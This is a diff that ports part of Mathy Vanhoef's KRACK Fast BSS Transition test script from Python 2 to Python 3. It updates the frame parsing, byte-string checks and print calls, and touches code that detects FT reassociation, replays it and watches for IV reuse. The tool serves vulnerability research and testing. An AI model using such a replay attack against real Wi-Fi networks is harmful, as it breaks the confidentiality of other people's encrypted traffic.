@@ -1,6 +1,6 @@
-#!/usr/bin/env python2
+#!/usr/bin/env python3
 
-# Copyright (c) 2017, Mathy Vanhoef <Mathy.Vanhoef@cs.kuleuven.be>
+# Copyright (c) 2017-2021, Mathy Vanhoef <Mathy.Vanhoef@cs.kuleuven.be>
 #
 # This code may be distributed under the terms of the BSD license.
 # See LICENSE for more details.
@@ -10,14 +10,6 @@ logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 from libwifi import *
 import sys, socket, struct, time, subprocess, atexit, select
-
-IEEE_TLV_TYPE_RSN = 48
-IEEE_TLV_TYPE_FT  = 55
-
-IEEE80211_RADIOTAP_RATE = (1 << 2)
-IEEE80211_RADIOTAP_CHANNEL = (1 << 3)
-IEEE80211_RADIOTAP_TX_FLAGS = (1 << 15)
-IEEE80211_RADIOTAP_DATA_RETRIES = (1 << 17)
 
 #TODO: - Merge code with client tests to avoid code duplication (including some error handling)
 #TODO: - Option to use a secondary interface for injection + WARNING if a virtual interface is used + repeat advice to disable hardware encryption
@@ -52,11 +44,11 @@ class KRAckAttackFt():
 		# FIXME: Put this check in MitmSocket? We want to check this in client tests as well!
 		if self.clientmac in [p.addr1, p.addr2] and Dot11WEP in p:
 			# If the hardware adds/removes the TKIP/CCMP header, this is where the plaintext starts
-			payload = str(p[Dot11WEP])
+			payload = get_ccmp_payload(p)
 
 			# Check if it's indeed a common LCC/SNAP plaintext header of encrypted frames, and
 			# *not* the header of a plaintext EAPOL handshake frame
-			if payload.startswith("\xAA\xAA\x03\x00\x00\x00") and not payload.startswith("\xAA\xAA\x03\x00\x00\x00\x88\x8e"):
+			if payload.startswith(b"\xAA\xAA\x03\x00\x00\x00") and not payload.startswith(b"\xAA\xAA\x03\x00\x00\x00\x88\x8e"):
 				log(ERROR, "ERROR: Virtual monitor interface doesn't seem to pass 802.11 encryption header to userland.")
 				log(ERROR, "   Try to disable hardware encryption, or use a 2nd interface for injection.", showtime=False)
 				quit(1)
@@ -67,7 +59,7 @@ class KRAckAttackFt():
 			log(INFO, "Detected Authentication frame, clearing client state")
 		elif p.addr2 == self.clientmac and Dot11ReassoReq in p:
 			self.reset_client()
-			if get_tlv_value(p, IEEE_TLV_TYPE_RSN) and get_tlv_value(p, IEEE_TLV_TYPE_FT):
+			if get_element(p, IEEE_TLV_TYPE_RSN) and get_element(p, IEEE_TLV_TYPE_FT):
 				log(INFO, "Detected FT reassociation frame")
 				self.start_replay(p)
 			else:
@@ -77,7 +69,7 @@ class KRAckAttackFt():
 			self.reset_client()
 
 		# Encrypted data sent to the client
-		elif p.addr1 == self.clientmac and Dot11WEP in p:
+		elif p.addr1 == self.clientmac and dot11_is_encrypted_data(p):
 			iv = dot11_get_iv(p)
 			log(INFO, "AP transmitted data using IV=%d (seq=%d)" % (iv, dot11_get_seqnum(p)))
 			if self.ivs.is_iv_reused(p):
@@ -152,7 +144,7 @@ def argv_get_interface():
 
 if __name__ == "__main__":
 	if len(sys.argv) <= 1 or "--help" in sys.argv or "-h" in sys.argv:
-		print "See README.md for instructions on how to use this script"
+		print("See README.md for instructions on how to use this script")
 		quit(1)
 
 	# TODO: Verify that we only accept CCMP?
@@ -164,5 +156,3 @@ if __name__ == "__main__":
 	attack = KRAckAttackFt(interface)
 	atexit.register(cleanup)
 	attack.run()
-
-
